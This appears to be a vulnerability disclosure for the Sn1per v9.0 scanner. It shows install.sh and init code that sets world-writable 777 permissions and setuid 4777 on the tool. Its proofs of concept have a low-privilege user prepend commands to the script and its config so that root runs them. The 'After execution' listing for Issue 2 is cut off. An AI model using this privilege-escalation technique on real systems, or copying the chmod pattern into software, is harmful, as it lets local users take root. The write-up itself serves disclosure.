# sec-issues-sn1per-v90-free
root@snipertest:~# uname -a
Linux snipertest 5.11.0-1014-gcp #16-Ubuntu SMP Wed Jul 14 15:51:11 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

root@snipertest:~# cat  /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=21.04
DISTRIB_CODENAME=hirsute
DISTRIB_DESCRIPTION="Ubuntu 21.04"


https://github.com/1N3/Sn1per

release v.9.0


KALI/UBUNTU/DEBIAN/PARROT LINUX INSTALL:

git clone https://github.com/1N3/Sn1per
cd Sn1per
bash install.sh



root@snipertest:~# git clone https://github.com/1N3/Sn1per
Cloning into 'Sn1per'...
remote: Enumerating objects: 2838, done.
remote: Counting objects: 100% (13/13), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 2838 (delta 5), reused 10 (delta 4), pack-reused 2825
Receiving objects: 100% (2838/2838), 43.18 MiB | 18.76 MiB/s, done.
Resolving deltas: 100% (1950/1950), done.
root@snipertest:~# cd Sn1per/
root@snipertest:~/Sn1per# bash install.sh
                ____
    _________  /  _/___  ___  _____
   / ___/ __ \ / // __ \/ _ \/ ___/
  (__  ) / / // // /_/ /  __/ /
 /____/_/ /_/___/ .___/\___/_/
               /_/

 + -- --=[ https://xerosecurity.com
 + -- --=[ Sn1per by @xer0dayz

[>] This script will install sn1per under /usr/share/sniper. Are you sure you want to continue? (Hit Ctrl+C to exit)
y

....

'/usr/share/sniper/sniper.conf' -> '/root/.sniper.conf'
Please run msfdb as a non-root user
[*] Adding start menu and desktop shortcuts...
[>] Done!
[>] To run, type 'sniper'!
root@snipertest:~/Sn1per#


---- ISSUE 1 ----

Insecure permissions of installation directory (777) allow privilege escalation.


root@snipertest:~/Sn1per# which sniper
/usr/bin/sniper
root@snipertest:~/Sn1per# ls -la /usr/bin/sniper
lrwxrwxrwx 1 root root 24 Aug 16 19:41 /usr/bin/sniper -> /usr/share/sniper/sniper
root@snipertest:~/Sn1per# ls -la /usr/share/sniper/sniper
-rwxr-xr-x 1 root root 28290 Aug 16 18:33 /usr/share/sniper/sniper
root@snipertest:~/Sn1per# ls -ld /usr/share/sniper/
drwxrwxrwx 10 root root 4096 Aug 16 19:19 /usr/share/sniper/
root@snipertest:~/Sn1per# ls -la /usr/share/sniper/
total 6668
drwxrwxrwx  10 root root    4096 Aug 16 19:19 .
drwxr-xr-x 222 root root   12288 Aug 16 19:41 ..
-rw-r--r--   1 root root   36518 Aug 16 18:33 CHANGELOG.md
-rw-r--r--   1 root root    1269 Aug 16 18:33 Dockerfile
-rw-r--r--   1 root root     306 Aug 16 18:33 LICENSE.md
-rw-r--r--   1 root root   11697 Aug 16 18:33 README.md
-rw-r--r--   1 root root 6491364 Aug 16 18:33 Sn1per.gif
-rw-r--r--   1 root root  159147 Aug 16 18:33 Sn1per.jpg
drwxr-xr-x   2 root root    4096 Aug 16 18:33 bin
drwxr-xr-x   2 root root    4096 Aug 16 19:41 conf
-rwxr-xr-x   1 root root   11548 Aug 16 18:33 install.sh
drwxr-xr-x   9 root root    4096 Aug 16 19:42 loot
drwxr-xr-x   2 root root    4096 Aug 16 18:33 modes
drwxr-xr-x  43 root root    4096 Aug 16 19:27 plugins
drwxr-xr-x   2 root root    4096 Aug 16 18:33 pro
-rw-r--r--   1 root root     276 Aug 16 18:33 sn1per.desktop
-rw-r--r--   1 root root    4283 Aug 16 18:33 sn1per.png
-rwxr-xr-x   1 root root   28290 Aug 16 18:33 sniper
-rw-r--r--   1 root root    9752 Aug 16 18:33 sniper.conf
drwxr-xr-x   4 root root    4096 Aug 16 18:33 templates
-rwxr-xr-x   1 root root     980 Aug 16 18:33 uninstall.sh
drwxr-xr-x   2 root root    4096 Aug 16 18:33 wordlists


user@snipertest:~$ id
uid=1001(user) gid=1002(user) groups=1002(user),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd),1000(ubuntu),1001(google-sudoers)
user@snipertest:~$ cd /usr/share/sniper/
user@snipertest:/usr/share/sniper$ ls -la
total 6668
drwxrwxrwx  10 root root    4096 Aug 16 19:19 .
drwxr-xr-x 222 root root   12288 Aug 16 19:41 ..
-rw-r--r--   1 root root   36518 Aug 16 18:33 CHANGELOG.md
-rw-r--r--   1 root root    1269 Aug 16 18:33 Dockerfile
-rw-r--r--   1 root root     306 Aug 16 18:33 LICENSE.md
-rw-r--r--   1 root root   11697 Aug 16 18:33 README.md
-rw-r--r--   1 root root 6491364 Aug 16 18:33 Sn1per.gif
-rw-r--r--   1 root root  159147 Aug 16 18:33 Sn1per.jpg
drwxr-xr-x   2 root root    4096 Aug 16 18:33 bin
drwxr-xr-x   2 root root    4096 Aug 16 19:41 conf
-rwxr-xr-x   1 root root   11548 Aug 16 18:33 install.sh
drwxr-xr-x   9 root root    4096 Aug 16 19:42 loot
drwxr-xr-x   2 root root    4096 Aug 16 18:33 modes
drwxr-xr-x  43 root root    4096 Aug 16 19:27 plugins
drwxr-xr-x   2 root root    4096 Aug 16 18:33 pro
-rw-r--r--   1 root root     276 Aug 16 18:33 sn1per.desktop
-rw-r--r--   1 root root    4283 Aug 16 18:33 sn1per.png
-rwxr-xr-x   1 root root   28290 Aug 16 18:33 sniper
-rw-r--r--   1 root root    9752 Aug 16 18:33 sniper.conf
drwxr-xr-x   4 root root    4096 Aug 16 18:33 templates
-rwxr-xr-x   1 root root     980 Aug 16 18:33 uninstall.sh
drwxr-xr-x   2 root root    4096 Aug 16 18:33 wordlists

Issue:

Lines 37-40 of install script

mkdir -p $INSTALL_DIR 2> /dev/null
chmod 777 -Rf $INSTALL_DIR 2> /dev/null
chown root $INSTALL_DIR/sniper 2> /dev/null
chmod 4777 $INSTALL_DIR/sniper 2> /dev/null


PoC via script modification:

user@snipertest:/usr/share/sniper$ mv sniper .sniper.orig
user@snipertest:/usr/share/sniper$ echo "touch /proof" > sniper
user@snipertest:/usr/share/sniper$ cat .sniper.orig >> sniper
user@snipertest:/usr/share/sniper$ chmod +x sniper
user@snipertest:/usr/share/sniper$ ls -la sniper
-rwxrwxr-x 1 user user 28303 Aug 16 19:48 sniper
user@snipertest:/usr/share/sniper$


root@snipertest:~# sniper
[*] Loaded configuration file from /usr/share/sniper/sniper.conf [OK]
[*] Loaded configuration file from /root/.sniper.conf [OK]
                ____
    _________  /  _/___  ___  _____
   / ___/ __ \ / // __ \/ _ \/ ___/
  (__  ) / / // // /_/ /  __/ /
 /____/_/ /_/___/ .___/\___/_/
               /_/

 + -- --=[ https://xerosecurity.com
 + -- --=[ Sn1per v9.0 by @xer0dayz

You need to specify a target or workspace to use. Type sniper --help for command usage.
root@snipertest:~#

root@snipertest:~# ls -la /proof
-rw-r--r-- 1 root root 0 Aug 16 19:49 /proof

PoC 2 via config file modification:

user@snipertest:/usr/share/sniper$ mv sniper.conf .sniper.conf.orig
user@snipertest:/usr/share/sniper$ echo "touch /proof2" > sniper.conf
user@snipertest:/usr/share/sniper$ cat .sniper.conf.orig >> sniper.conf
user@snipertest:/usr/share/sniper$

root@snipertest:~# ls -la /proof2
ls: cannot access '/proof2': No such file or directory
root@snipertest:~# sniper
[*] Loaded configuration file from /usr/share/sniper/sniper.conf [OK]
[*] Loaded configuration file from /root/.sniper.conf [OK]
                ____
    _________  /  _/___  ___  _____
   / ___/ __ \ / // __ \/ _ \/ ___/
  (__  ) / / // // /_/ /  __/ /
 /____/_/ /_/___/ .___/\___/_/
               /_/

 + -- --=[ https://xerosecurity.com
 + -- --=[ Sn1per v9.0 by @xer0dayz

You need to specify a target or workspace to use. Type sniper --help for command usage.
root@snipertest:~# ls -la /proof2
-rw-r--r-- 1 root root 0 Aug 16 19:52 /proof2
root@snipertest:~#


---- ISSUE 2 ----

Scanner sets insecure permissions on /usr/share/sniper and it's contents on execution. All file permissions are set to 777 while scanner script is set to 4777, allowing privilege escalation to root.

Before first execution:

root@snipertest:~# ls -la /usr/share/sniper/
total 6668
drwxrwxrwx  10 root root    4096 Aug 16 19:19 .
drwxr-xr-x 222 root root   12288 Aug 16 19:41 ..
-rw-r--r--   1 root root   36518 Aug 16 18:33 CHANGELOG.md
-rw-r--r--   1 root root    1269 Aug 16 18:33 Dockerfile
-rw-r--r--   1 root root     306 Aug 16 18:33 LICENSE.md
-rw-r--r--   1 root root   11697 Aug 16 18:33 README.md
-rw-r--r--   1 root root 6491364 Aug 16 18:33 Sn1per.gif
-rw-r--r--   1 root root  159147 Aug 16 18:33 Sn1per.jpg
drwxr-xr-x   2 root root    4096 Aug 16 18:33 bin
drwxr-xr-x   2 root root    4096 Aug 16 19:41 conf
-rwxr-xr-x   1 root root   11548 Aug 16 18:33 install.sh
drwxr-xr-x   9 root root    4096 Aug 16 19:42 loot
drwxr-xr-x   2 root root    4096 Aug 16 18:33 modes
drwxr-xr-x  43 root root    4096 Aug 16 19:27 plugins
drwxr-xr-x   2 root root    4096 Aug 16 18:33 pro
-rw-r--r--   1 root root     276 Aug 16 18:33 sn1per.desktop
-rw-r--r--   1 root root    4283 Aug 16 18:33 sn1per.png
-rwxr-xr-x   1 root root   28290 Aug 16 18:33 sniper
-rw-r--r--   1 root root    9752 Aug 16 18:33 sniper.conf
drwxr-xr-x   4 root root    4096 Aug 16 18:33 templates
-rwxr-xr-x   1 root root     980 Aug 16 18:33 uninstall.sh
drwxr-xr-x   2 root root    4096 Aug 16 18:33 wordlists


root@snipertest:~# sniper -t 192.168.1.1
[*] Loaded configuration file from /usr/share/sniper/sniper.conf [OK]
[*] Loaded configuration file from /root/.sniper.conf [OK]
[*] Saving loot to /usr/share/sniper/loot/ [OK]
[*] Scanning 192.168.1.1 [OK]
...
[*] Opening loot directory /usr/share/sniper/loot/workspace/192.168.1.1 [OK]
 + -- --=[ Generating reports...
[]
 + -- --=[ Sorting all files...
 + -- --=[ Removing blank screenshots and files...
 + -- --=[ Sn1per Professional is not installed. To download Sn1per Professional, go to https://xerosecurity.com.
 + -- --=[ Done!


After execution:

Is

Issue:

Lines 464-466 from init function

  chmod 777 -Rf $INSTALL_DIR 2> /dev/null
  chown root $INSTALL_DIR/sniper 2> /dev/null
  chmod 4777 $INSTALL_DIR/sniper 2> /dev/null


